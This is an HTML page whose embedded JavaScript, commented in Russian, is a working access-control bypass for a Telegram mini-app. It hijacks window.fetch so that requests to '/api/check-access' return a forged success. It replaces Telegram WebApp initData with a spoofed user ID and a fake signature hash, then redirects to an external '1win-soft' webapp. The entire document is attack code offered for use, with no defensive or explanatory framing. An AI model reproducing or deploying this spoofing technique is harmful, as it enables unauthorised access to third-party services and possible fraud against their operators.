<!DOCTYPE html>
<html>
<head>
    <script>
        // 1. Блокируем ВСЕ запросы к API до нашей подмены
        const originalFetch = window.fetch;
        window.fetch = function(url, options) {
            if (typeof url === 'string' && url.includes('/api/check-access')) {
                console.log("[Блокировка] Оригинальный запрос отменён");
                return Promise.resolve(new Response(JSON.stringify({
                    status: true,
                    message: "Успешный доступ (подмена)"
                }), {
                    status: 200,
                    headers: { 'Content-Type': 'application/json' }
                }));
            }
            return originalFetch(url, options);
        };

        // 2. Подменяем Telegram WebApp данные
        window.Telegram = {
            WebApp: {
                initData: `user=${encodeURIComponent(JSON.stringify({
                    id: 7796998065,  // Ваш FAKE_ID
                    first_name: "User",
                    last_name: "Fake",
                    username: "fake_user",
                    language_code: "en"
                }))}&auth_date=${Math.floor(Date.now()/1000)}&hash=fake_hash`,
                initDataUnsafe: {
                    user: { id: 7796998065 /* ... */ },
                    query_id: "fake_query_id",
                    auth_date: Math.floor(Date.now()/1000),
                    hash: "fake_hash_" + Math.random().toString(36).substring(2)
                },
                ready: () => {},
                version: "6.7",
                platform: "web",
                isExpanded: true
            }
        };

        // 3. Перенаправление после подмены
        setTimeout(() => {
            window.location.href = "https://1win-soft.com/webapp/";
        }, 1000);
    </script>
    
    <!-- Подключаем Telegram WebApp JS ПОСЛЕ подмены -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
    <div>Инициализация подмены Telegram ID...</div>
</body>
</html>
